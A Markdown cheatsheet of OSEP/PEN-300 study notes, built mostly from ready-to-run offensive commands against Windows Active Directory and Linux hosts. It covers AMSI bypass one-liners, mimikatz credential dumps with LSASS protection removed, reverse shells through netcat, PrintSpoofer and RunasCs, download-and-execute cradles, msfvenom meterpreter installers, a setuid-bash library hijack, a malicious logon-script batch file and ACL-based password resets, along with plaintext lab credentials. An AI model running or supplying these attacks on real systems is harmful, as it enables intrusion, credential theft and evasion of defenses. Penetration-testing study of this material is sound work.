# OSEP (PEN-300) Notes & Cheatsheet

> A collection of commands, techniques, and resources gathered during the OffSec PEN-300 / OSEP course. Intended to help future students navigate the exam and labs.

> [!WARNING]
> **For educational and authorized penetration testing purposes only.**

---

## 📚 Resources & References

### Official
- [OSEP Exam Guide (OffSec)](https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide#exam-restrictions)

### Notes & Cheatsheets
| Resource | Description |
|---|---|
| [OSEP_Notes – OoStellarnightoO](https://github.com/OoStellarnightoO/OSEP_Notes) | OSEP checklist and notes |
| [OSEP Notes – In3x0rabl3](https://github.com/In3x0rabl3/OSEP) | Community notes |
| [OSEP Notes – The-Viper-One](https://github.com/The-Viper-One/OSEP-Notes) | Comprehensive OSEP notes |
| [OSEP Notes – buyne](https://github.com/buyne/OSEP-1) | Community notes |
| [OSEP Everything – beauknowstech](https://github.com/beauknowstech/OSEP-Everything/tree/main) | Everything OSEP |
| [Sliver Cheatsheet](https://github.com/Anon-Exploiter/sliver-cheatsheet) | Sliver C2 reference |
| [OSEP Enum Script](https://github.com/jayesther/OSEP_OSED_TOOLS/blob/main/OSEP_enum.ps1) | Enumeration PowerShell script |
| [Useful Gist – siddicky](https://gist.github.com/siddicky/bf3a0a04c1fc8ea63b0aa0c78977726b) | OSEP tips and tricks |

### PEN-300 OSEP Similar Boxes
| Resource | Description |
|---|---|
| [OSEP_VM List – TJ Null](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#gid=998752843) | Similar machines for practice|
| [HTB – Zephyr](https://app.hackthebox.com/prolabs/6) | Extra machines (Similar level to OSEP) |
| [HTB – Cybernetics](https://app.hackthebox.com/prolabs/3) | Extra machines (Harder than OSEP) |
| [HTB – Dante](https://app.hackthebox.com/prolabs/4) | Extra machines |


### Tools & Code
| Resource | Description |
|---|---|
| [OSEPlayground – Extravenger](https://github.com/Extravenger/OSEPlayground/tree/main) | Useful tools and scripts for PEN-300 |
| [OSEP-Tools – Octoberfest7](https://github.com/Octoberfest7/OSEP-Tools) | OSEP tooling |
| [OSEP-Code-Snippets – chvancooten](https://github.com/chvancooten/OSEP-Code-Snippets) | Code snippets |
| [osep-tools – tree-chtsec](https://github.com/tree-chtsec/osep-tools) | Community tools |
| [OSEP_OSED_TOOLS – jayesther](https://github.com/jayesther/OSEP_OSED_TOOLS/blob/main/OSEP_enum.ps1) | Enumeration tools |

### Evasion & Bypass
| Resource | Description |
|---|---|
| [RefractionMirage – ZumiYumi](https://github.com/ZumiYumi/RefractionMirage) | Remote dynamic .NET obfuscator + AMSI/ETW bypass |
| [NeverEnderDll – ZumiYumi](https://github.com/ZumiYumi/NeverEnderDll) | Layered encrypted rundll32 AppLocker bypass |
| [Eos-Loader – ZumiYumi](https://github.com/ZumiYumi/Eos-Loader) | Python loader for AES reflectively loaded reverse shell |
| [FullBypass – Sh3lldon](https://github.com/Sh3lldon/FullBypass) | Bypasses AMSI and PowerShell CLM; gives FullLanguage reverse shell |
| [BadAssMacros – Inf0secRabbit](https://github.com/Inf0secRabbit/BadAssMacros) | C# automated malicious macro generator |

### Utilities
- [Hash Identifier](https://hashes.com/en/tools/hash_identifier)

---

## ✅ Engagement Checklist

> Run these steps systematically every time you gain a new credential or foothold.

1. **New user → spray SMB**
   - For every new user found, run:
   ```bash
   $ nxc smb 10.19.2.0/24 -u 'newuser' -p 'Pass123'
   ```

2. **New user → check MSSQL**
   ```bash
   $ mssqlpwner domain.com/newuser:pass@DB enumerate
   # Also run the machine account if you see a system that is hosting a website, or any kind of frontend then run its machine account too.
   ```

3. **Check for SSH keys**
   ```powershell
   $ tree /F /A C:\Users
   # Look for users with a .ssh directory
   # If you have plaintext creds:
   $ nxc ssh 0/24 -u user@domain.com -p pass
   #Inspect other files, and PowerShell console host history files.
   ```

4. **Linux post-root**
   ```bash
   $ tcpdump -i eth0 -w /tmp/capture.pcap
   $ ls /tmp
   # Add your own SSH key after rooting for a stable SSH session
   ```

5. **Linux priv esc**
   ```bash
   $ ./pspy64
   # sudo -l
   $ ./linpeas.sh
   ```

6. **Linux loot** – After rooting, look for:
   - Other users' SSH keys (`~/.ssh/`)
   - Secrets and environment files
   - Ansible vaults
   - Keytab files (`/etc/krb5.keytab`, `/tmp/krb5cc_*`)
   - Automation credentials

7. **New user → BloodHound**
   ```bash
   bloodhound-python -u 'user' -p 'pass' -d domain.com -ns DC_IP -c All
   ```

8. **New domain / privileged user → SharpHound**
   ```powershell
   SharpHound.exe -s --recursedomains
   ```

9. **Check owned users outbound ACLs** execution privileges, local admin status, group membership, and groups' outbound ACLs.

10. **NTLM hash → try cracking**
    - For every NTLM hash obtained, check [NTLM.pw](https://ntlm.pw) to see if plaintext is available for SSH credential spraying.

11. **Run a background Nmap scan** once AD quick wins are exhausted to identify alternative lateral movement routes.

12. **New user → bloodyAD writeable check**
    - Check what write permissions an owned user has:
    ```bash
    bloodyAD -u user -p pass -d domain.com --dc-host dc01.domain.com get object appadmin --type writeable
    ```

13. **LAPS spray**
    - Spray LAPS passwords across the subnet if you have a user with LAPS reader permissions:
    ```bash
    nxc smb 0/24 -u 'user' -p 'pass' --laps
    ```

14. **If stuck:**
    - Mark all owned users/systems in BloodHound.
    - Re-run `bloodhound-python` and `SharpHound` on every new user/system.
    - Check `C:\Users` and non-default folders in `C:\`.
    - Review your Nmap scan results.

15. **Local admin hash → spray**
    - Extract local admin hashes from compromised systems and spray them across the network:
    ```bash
    nxc smb 192.168.110.0/24 -u Administrator -H <hash> --local-auth
    ```

16. **Spray all plaintext passwords**
    ```bash
    psmapexec Spray -SprayPassword <passwordlist>
    ```

17. **UDP scan if stuck**
    ```bash
    sudo nmap -sU --top-ports 20 -oA udp_scan <target>
    ```

18. **Try username as password.**

19. **New machine → mimikatz / hash dump**
    ```bash
    john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
    ```

20. **Check SMB config**
    ```bash
    cat /etc/samba/smb.conf
    ```

21. **Capture network traffic for creds**
    ```bash
    tcpdump -i ens124 -w network_captured.pcap
    # OR filter Kerberos/LDAP
    tcpdump -i ens124 port 88 or port 389 -w network_captured.pcap
    ```

22. **ADCS → `certipy`**

23. **IMPACKET MSSQL**
    ```bash
    impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@dc01.darkzero.htb -windows-auth
    ```

24. **Recovering Deleted AD Objects**
    ```PowerShell
    Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
    Get-ADOptionalFeature 'Recycle Bin Feature'
    Restore-ADObject -Identity <ObjectGUID>
    ```

25. **Requesting a Kerberos TGT**
    ```Bash
    impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.76
    export KRB5CCNAME=svc_ldap.ccache
    ```

26. **Using kinit** We can also use kinit instead of get-TGT. what is does is that it puts it in the default location so I don’t have to set any environment variables to use it.
    ```Bash
    kinit svc_winrm@VOLEUR.HTB
    klist
    evil-winrm -i dc.voleur.htb -r voleur.htb
    ```

27. **RunasCs in Evil-WinRM**
    ```PowerShell
    upload RunasCs.cs
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
    ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.85:443 --bypass-uac
    ```

28. **Netcat Execution**
    ```PowerShell
    start-process .\nc64.exe -args "-e cmd.exe 10.10.14.5 4444"
    ```

29. **PowerShell History Inspection**
    ```PowerShell
    (Get-PSReadlineOption).HistorySavePath
    type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console
    ```

---

## 🔍 Enumeration

### Nmap
```bash
# Fast full port scan
nmap -p- -sC -sV -A -Pn -n --open --min-rate=10000 192.168.57.120-122

# From a host list (Add all IPs to hosts.lst file)
nmap -p- -A -Pn -n --open --min-rate=10000 -iL hosts.lst

# All ports on subnet
sudo nmap -p- --min-rate=10000 -v -oA allports 10.10.110.0/24

# Detailed Service/Version Scan
sudo nmap -p<discovered-ports> -sV -sC -oA zephyr_details <target-ip>

# UDP Top 20
sudo nmap -sU --top-ports 20 -oA udp_scan <target-ip>
```

### NetExec (nxc)
```bash
nxc smb 10.19.2.0/24 -u 'newuser' -p 'Pass123'

# Auto-populate /etc/hosts
nxc smb 172.16.XX.XX/24 -u '' -p '' --generate-hosts-file hostfile

# Hash auth
nxc smb 172.16.51.166 -u 'jim' -H e48c13cefd8f9456d79cd49651c134e8 -d 'complyedge.com'

# Kerberos auth with ccache
nxc smb 172.16.54.168 -u pete -k --use-kcache --ntds
nxc smb 172.16.54.168 -u pete -k --use-kcache --lsa

# WinRM
nxc winrm 172.16.157.0/24 -u pete -p 'Password123'

# Trusted for delegation
nxc ldap DC_IP -u 'user' -p 'pass' --trusted-for-delegation

# LAPS
nxc smb 0/24 -u 'user' -p 'pass' --laps
nxc ldap <DC> -u <User> -H 'hash' --module laps

# Users from machine account
nxc smb 172.16.54.168 -u 'WEB05$' -H <hash> --users
```

### Directory Search
```bash
dirsearch -u http://192.168.52.171/ -t 100 --full-url -x 404
```

### PowerView
```powershell
# Load (bypass restrictions)
$pv = Get-Content "C:\Windows\Tasks\PowerView.ps1" -Raw
IEX $pv

# Retrieve useful data
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainTrust

# Constrained Delegation (Also check **_TRUSTED_TO_AUTH_FOR_DELEGATION_** flag set, which means it can impersonate any user through the S4U protocol transition)
Get-DomainComputer -TrustedToAuth

# Unconstrained Delegation
Get-DomainComputer -Unconstrained
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Domain SID
Get-DomainSID
Get-DomainSID -Domain child.domain.com
```

### Domain Enumeration
```powershell
# Get list of DCs in domain
$ nltest /dclist:FINAL
$ nslookup dc01.domain.com

# List of domain trusts
$ nltest /domain_trusts

# DNS records
$ Get-DnsServerResourceRecord -ZoneName "corp.local" -RRType "A" | Select-Object HostName, @{Name="IPAddress";Expression={$_.RecordData.IPv4Address.IPAddressToString}}

# Host info (detect a multitude of host-based settings and information)
https://github.com/dafthack/HostRecon
$ (new-object system.net.webclient).downloadstring('http://<kali>/HostRecon.ps1') | IEX
$ Invoke-HostRecon

# LSA Protection (Checks the _RunAsPPL_ registry key to determine if LSA protection is enabled with the Get-ItemProperty cmdlet:)
$ Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"

# Application whitelisting (AppLocker rules do not apply to the built-in local accounts such as Local System, Local Service, or Network Service. Neither do they apply to the IIS DefaultAppPool account, which means we only worry about AppLocker if we migrate into a process of a different user.)
$ Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
$ Get-AppLockerPolicy -Effective -Xml

# PowerShell history
$ (Get-PSReadlineOption).HistorySavePath
$ type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Running processes
$ tasklist /v

# Discover hosts in a network
$ ipconfig /all #Info about interfaces
$ route print #Print available routes
$ arp -a
$ netstat -ano #Opened ports
$ type C:\WINDOWS\System32\drivers\etc\hosts
$ ipconfig /displaydns | findstr "Record" | findstr "Name Host"

# Port test
$ Test-NetConnection -ComputerName 10.10.17.10 -Port 445
```

### Linux Useful Commands
```bash
$ cat /etc/krb5.conf
$ cat /etc/krb5.keytab
$ ls /tmp    # Look for krb5cc_* files

# search filesystem
$ find / -name krb5cc_* 2>/dev/null
$ sudo klist -kt /etc/krb5.keytab

#https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py
kali@kali$ python keytabextract.py ../krb5.keytab
```

---

## 🔑 Credential Harvesting

### AMSI Bypass
```powershell
# In-memory AMSI bypass (amsi.txt)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Alternative
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)

# Remote load
(new-object system.net.webclient).downloadstring('http://<kali>/amsi.txt') | IEX
```

### secretsdump / lsassy
```bash
impacket-secretsdump 'domain.com/user:pass@target'
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> 'DOMAIN.COM/user'@dc.domain.com -just-dc-user krbtgt
```

### Mimikatz
```powershell
# Standard dump
.\mimikatz.exe "sekurlsa::logonPasswords" "exit"
.\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"

# DCSync
.\mimikatz.exe "lsadump::dcsync /user:painters\krbtgt /all /csv" "exit"
.\mimikatz32.exe "lsadump::dcsync /user:painters\matt /history" "exit"

# Full bypass + dump
.\mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "token::elevate" "sekurlsa::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"
```

### Dump LSASS (PPL Bypass)
**mimidrv.sys**
- When LSA protection is enabled, the LSASS process is marked as Protected Process Light (PPL), meaning that we cannot inject code or tamper with the process. This enforcement is performed from the kernel and to solve this issue, we'll leverage the mimidrv.sys driver that accompanies Mimikatz.

> Use when `RunAsPPL = 1`:
```powershell
  PS C:\windows\system32\inetsrv> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"

RunAsPPL     : 1
```

```powershell
# 1. Upload mimidrv.sys located in our kali machine
#/usr/share/windows-resources/mimikatz/x64/mimidrv.sys
PS C:\inetpub\wwwroot\upload> certutil -urlcache -f http://192.168.49.64/mimidrv.sys mimidrv.sys

# 2. Create and start the driver service
C:\Windows\system32> sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand

[SC] CreateService SUCCESS


C:\Windows\system32> sc start mimidrv

SERVICE_NAME: mimidrv 
        TYPE               : 1  KERNEL_DRIVER  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              : 

# 3. Bypass AMSI, upload mimikatz.txt, and instruct it to turn off the LSASS PPL protection.
PS C:\Windows\system32> (New-Object System.Net.WebClient).DownloadString('http://192.168.49.55/amsi.txt') | IEX
#https://github.com/g4uss47/Invoke-Mimikatz/blob/master/Invoke-Mimikatz.ps1
# mimikatz.txt is Invoke-Mimikatz.ps1 (cp Invoke-Mimikatz.ps1 mimikatz.txt)
PS C:\Windows\system32> (New-Object System.Net.WebClient).DownloadString('http://192.168.49.55/mimikatz.txt') | IEX
PS C:\Windows\system32> Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""

#When the command is executed, the driver successfully turns off LSASS protection. Just after that, Windows Defender detects the execution of Mimikatz and shuts down the PowerShell process.

# 4. Now we can (MiniDumpWriteDump) then parse it offline or we can just use Invoke-Mimikatz.
```

### Rubeus
```powershell
# Load into memory (bypass AMSI first)
#https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
PS C:\Windows\system32> (New-Object System.Net.WebClient).DownloadString('http://192.168.49.55/amsi.txt') | IEX
PS C:\Windows\system32> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.55/Rubeus.exe')
PS C:\Windows\system32> $assem = [System.Reflection.Assembly]::Load($data)

# Kerberoast
[Rubeus.Program]::Main("kerberoast /user:svc_web /nowrap".Split())

# S4U Delegation
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/file01 /ptt /nowrap".Split())

# Dump creds
[Rubeus.Program]::Main("dump /user:administrator /nowrap".Split())

# Ask for TGT from hash
.\Rubeus.exe asktgt /user:adminWebSvc /domain:domain.com /ntlm:<hash> /ptt

# Monitor for TGTs (Print Spooler / Coercion)
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC03$

# Pass the ticket
.\Rubeus.exe ptt /ticket:<base64>
```

### Kerberos Tickets
```bash
# Request TGT (impacket)
$ impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.76
$ export KRB5CCNAME=svc_ldap.ccache

# Request TGT (kinit instead of get-TGT) what is does is that it puts it in the default location so I don’t have to set any environment variables to use it.) 
$ kinit svc_winrm@VOLEUR.HTB
$ klist

# Evil-WinRM with Kerberos (no password)
$ evil-winrm -i dc.domain.com -r domain.com

## .kirbi → .ccache conversion
# 1. Decode the Base64 into a binary .kirbi file
kali@kali$> cat ticket.txt | base64 -d > ticket.kirbi

# 2. Convert .kirbi to .ccache using Impacket's ticketConverter
kali@kali$> impacket-ticketConverter ticket.kirbi ticket.ccache

#3. Inject the Ticket into your Kali Session
kali@kali$> export KRB5CCNAME=ticket.ccache

#4. Now we can use psexec
kali@kali$> impacket-psexec -k -no-pass -target-ip 192.168.55.131 @file01
```

### SSH Key Extraction
```bash
# john
ssh2john msimpson.key > msimpson.hash
john --wordlist=/usr/share/wordlists/rockyou.txt msimpson.hash
```

---

## 🔒 Privilege Escalation

### SeImpersonatePrivilege
```powershell
whoami /priv
# If SeImpersonatePrivilege is Enabled:

# PrintSpoofer
PS C:\inetpub\wwwroot\upload> certutil -urlcache -f http://192.168.49.64/PrintSpoofer64.exe PrintSpoofer64.exe
PS C:\inetpub\wwwroot\upload> certutil -urlcache -f http://192.168.49.64/nc.exe nc.exe
PS C:\inetpub\wwwroot\upload> ./PrintSpoofer64.exe -c "nc64.exe 192.168.49.55 8080 -e cmd"
#OR
PS C:\inetpub\wwwroot\upload> ./PrintSpoofer64.exe -i -c cmd

# GodPotato
#https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
PS C:\windows\tasks> certutil -urlcache -f http://10.10.14.85:8000/GodPotato-NET4.exe GodPotato-NET4.exe
#You can create this Base64 encoded reverse shell from revshell.com.
PS C:\windows\tasks> .\GodPotato-NET4.exe -cmd 'powershell -exec bypass -enc JABjAG.............=='
```

### AlwaysInstallElevated
```powershell
C:\Windows\Tasks>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installerr
# If AlwaysInstallElevated = 0x1:

C:\Windows\Tasks> msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=192.168.45.165 LPORT=2222 -e x64/xor_dynamic -i 9 -f msi > malicious.msi 
C:\Windows\Tasks> msiexec /i malicious.msi /quiet /qn /norestart

#OR msfconsole
# 1. remember to set a x64 payload or else this wont work
use exploit/windows/local/always_install_elevated
#2.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> lport=443 -a x64 -f msi -o evil.msi
#3. on victim machine
msiexec /quiet /qn /i evil.msi
```

### Services (Weak Permissions)
```powershell
# 1. Check the Current Configuration
#systemctl --typer=service
C:\Windows\Tasks>sc.exe qc SNMPTRAP

# 2. Reconfigure the Service Change the binpath to execute a command and  Manual start
PS C:\windows\tasks> sc.exe config SNMPTRAP binpath= "cmd /c net localgroup administrators nina /add" obj= "LocalSystem"
[SC] ChangeServiceConfig SUCCESS

# 3. Change the service to run as LocalSystem
C:\Windows\Tasks>sc.exe config SNMPTRAP obj= "LocalSystem"

# 4. start a new PowerShell process as myself (nina). It will ask for creds and I just proviced nina password that we created  P@ssword123!
PS C:\windows\tasks> Start-Process powershell -Verb RunAs
```

### UAC Bypass (FodHelper)
```powershell
# https://github.com/tobor88/PowerShell-Red-Team/blob/master/Invoke-FodHelperBypass.ps1
PS C:\Windows\Tasks> (New-Object System.Net.WebClient).DownloadString('http://192.168.49.57:8080/Invoke-FodHelperBypass.ps1') | IEX

PS C:\Windows\Tasks> Invoke-FodHelperBypass
WARNING: This device is vulnerable to the fodhelper bypass method.

# 1. Start your listener on Kali
 nc -lvnp 1111

# 2. Run the bypass again, pointing it to your reverse shell
Invoke-FodHelperBypass -Program "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.57:8080/rev.ps1')"
```

### Constrained Language Mode (CLM) Bypass
```powershell
PS C:\users\ted\Desktop> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

PS C:\users\ted\Desktop> Get-AppLockerPolicy -Effective -Xml

# FullBypass: https://github.com/Sh3lldon/FullBypass
PS C:\Windows\Tasks> curl http://192.168.49.58:8000/FullBypass.csproj -o FullBypass.csproj
PS C:\Windows\Tasks> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj

[*] Attacker IP: 192.168.49.58
[*] Attacker port: 4444

#now if we check again
PS C:\Windows\Tasks> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

### Library Hijacking (Linux)
```bash
# 1. Check shared libraries
marks@cb3:/tmp$ ldd /bin/netstat

# 2. Create malicious library
# hijack.c:
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
}

#3. Next we build it in our machine:
kali@kali-[~] gcc -shared -o libselinux.so.1 hijack.o

#4. upload it and run it on the machine
marks@cb3:/tmp$ wget http://192.168.49.54/libselinux.so.1 -O libselinux.so.1
marks@cb3:/tmp$ export LD_LIBRARY_PATH=/tmp
marks@cb3:/tmp$ ./bash -p

#Note: if the above method didint work we also try the SUDO -E method:
marks@cb3:/tmp$ mkdir ldlib
marks@cb3:/ldlib$ cp /tmp/libpthread.so.0 .
marks@cb3:/ldlib$ nano .bashrc
alias sudo="sudo LD_LIBRARY_PATH=/home/marks/ldlib"
marks@cb3:/ldlib$ source ~/.bashrc
# then we wait 5 mins untill its ran
marks@cb3:/ldlib$ /tmp/bash -p
```

---

## 🏃 Lateral Movement

### Pass-the-Hash / Pass-the-Ticket
```bash
# PtH - psexec
$ impacket-psexec -no-pass -hashes :NTLM 'DOMAIN/user@target'

# PtH - wmiexec
$ wmiexec.py domain/user@target -no-pass -hashes :NTLM -k

# RDP with hash (enable restricted admin first)
C:\Windows\system32> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
kali@Kali$ xfreerdp /u:Administrator /pth:f99529e42ee77dc4704c568ba9320a34 /v:172.16.53.194 /cert:ignore /dynamic-resolution

# Kerberos - psexec
$ impacket-psexec -k -no-pass target.domain.com
```

### RunasCs
```powershell
# https://github.com/antonioCoco/RunasCs
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload RunasCs.cs
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command whoami"

#OR to get a reverse shell
# Reverse shell
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.85:443 --bypass-uac
```

### Evil-WinRM
```bash
$ evil-winrm -u 'user' -p 'Password' -i <target>
$ evil-winrm -u 'user' -H <NTLM_hash> -i <target>
$ evil-winrm -i dc.domain.com -r domain.com          # Kerberos
```

---

## 🗺️ Active Directory Attacks

### BloodHound
```bash
# Python collector (Linux)
$ bloodhound-python -u 'user' -p 'pass' -d domain.com -ns <DC_IP> -c All
$ bloodhound-python -u 'user' --hashes ':NTLM' -d domain.com -ns <DC_IP> -c All
$ bloodhound-python -c All -d domain.com -u 'user' -k -no-pass -gc dc.domain.com --zip --dns-tcp -ns <DC_IP>

# SharpHound (Windows)
*Evil-WinRM* PS C:\windows\tasks> SharpHound.exe --collectionmethods All
*Evil-WinRM* PS C:\windows\tasks> SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs

# rusthound-ce (alternative)
$ sudo apt install build-essential libkrb5-dev libclang-dev
$ cargo install rusthound-ce
$ rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -c All
```

### LAPS
```powershell
# Read LAPS (PowerView)
PS C:\Windows\Tasks> Get-DomainComputer -Properties ms-Mcs-AdmPwd | Where-Object { $_.'ms-mcs-admpwd' -ne $null }

# pyLAPS (Linux)
kali@kali$ python3 pyLAPS.py --action get -u 'Diane.Clarke' -d 'cowmotors.com' -p 'VYxALZuNAI6L' --dc-ip 172.16.194.100

# LAPSToolkit
## https://github.com/leoloobeek/LAPSToolkit
Import-Module ./Get-LAPSComputers
Get-LAPSComputers

# ldapsearch
ldapsearch -h streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

#OR
nxc ldap <DC of domain> -u <User> -H 'hash' --module laps

#OR
#check what objects can manage the LAPS
$ Find-AdmPwdExtendedRights -identity *
$ Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders
#https://github.com/ztrhgf/LAPS/tree/master/AdmPwd.PS
$ Import-Module AdmPwd.PS\AdmPwd.PS.psd1
$ get-admpwdpassword -computername dc01 | Select password

#OR
#1. discover groups that can fully enumerate the LAPS data:
https://github.com/leoloobeek/LAPSToolkit
PS C:\Tools> Import-Module .\LAPSToolkit.ps1
PS C:\Tools> Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com       corp1\LAPS Password Readers

#2. enumerate members of that group
PS C:\Tools> Get-NetGroupMember -GroupName "LAPS Password Readers"

GroupDomain  : corp1.com
GroupName    : LAPS Password Readers
MemberDomain : corp1.com
MemberName   : jeff
MemberSid    : S-1-5-21-1364860144-3811088588-1134232237-1110
IsGroup      : False
MemberDN     : CN=jeff,OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com

GroupDomain  : corp1.com
GroupName    : LAPS Password Readers
MemberDomain : corp1.com
MemberName   : admin
MemberSid    : S-1-5-21-1364860144-3811088588-1134232237-1107
IsGroup      : False
MemberDN     : CN=admin,OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com

#3. As the admin user, view the LAPS passwords
PS C:\Tools> Get-LAPSComputers

ComputerName       Password       Expiration
------------       --------       ----------
appsrv01.corp1.com gF3]5n{KsnyMwI 12/14/2019 04:18:03
```

### ACL Abuse

#### ForceChangePassword
```powershell
net user Shaun.Collins "NewPassword123!" /domain

# Or via ADSI
PS C:\Windows\Tasks> ([adsisearcher]"samaccountname=shaun.collins").findone().path
PS C:\Windows\Tasks> $user = [ADSI]"LDAP://CN=Shaun Collins,OU=hr,DC=cowmotors,DC=com"
PS C:\Windows\Tasks> $user.psbase.Invoke("SetPassword", "NewPassword123!")
PS C:\Windows\Tasks> $user.psbase.CommitChanges()

# Linux (bloodyAD)
bloodyAD -u 'attacker' -p 'pass' -d 'domain.com' --host DC01 set password 'VICTIM' 'NewPassword123!'

# net rpc
net rpc password "TargetUser" "newpassword" -U "local.com"/"ControlledUser"%"Password" -S "DC FQDN"
```

#### GenericWrite – ScriptPath Abuse
-  ScriptPath method: When a user logs into a Windows machine in a domain environment, the Domain Controller (DC) checks the user's object for a scriptPath. If one is defined, the client machine automatically downloads and executes that file from the SYSVOL share. This is a powerful way to get execution in the context of the target user without needing to crack their password first. By modifying the scriptPath attribute, you are telling the Windows domain that every time Shaun Blake logs in, his computer should execute the file located at your specified network path.
```bash
# Set up SMB share
impacket-smbserver share . -smb2support

# Set logon script
kali@kali$ bloodyAD --host DC01.cowmotors.com -d 'cowmotors.com' -u 'SHAUN.COLLINS' -p 'NewPassword123!' set object SHAUN.BLAKE scriptPath -v '\\192.168.49.57\share\reverse.bat'
[+] SHAUN.BLAKEs scriptPath has been updated

# reverse.bat
@echo off
\\192.168.49.57\share\nc64.exe -e cmd 192.168.49.57 4444
PAUSE
exit

# rev shell
rlwrap nc -lnvp 4444
```

#### GenericWrite – Shadow Credentials
```bash
# Force-reset N.Thompson's password to one you control
bloodyAD -u 'A.BRIGGS' -p 'P4ssw0rd1#123' -d 'delegate.vl' --host '10.129.234.69' -s set password 'N.THOMPSON' 'NewSecurePassword123!'

#OR
$ python3 pywhisker.py -d "delegate.vl" -u "A.BRIGGS" -p "P4ssw0rd1#123" --target "N.THOMPSON" --action "add"
[+] Saved PFX (#PKCS12) certificate & key at path: gJhCVng6.pfx
[*] Must be used with password: Q38QS3WyJL1sZzaTYNV7
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
#Next you can Request a TGT for N.THOMPSON
python ../../PKINITtools/gettgtpkinit.py delegate.vl/N.THOMPSON -cert-pfx gJhCVng6.pfx -pfx-pass 'Q38QS3WyJL1sZzaTYNV7' n_thompson.ccache

#OR
python3 targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
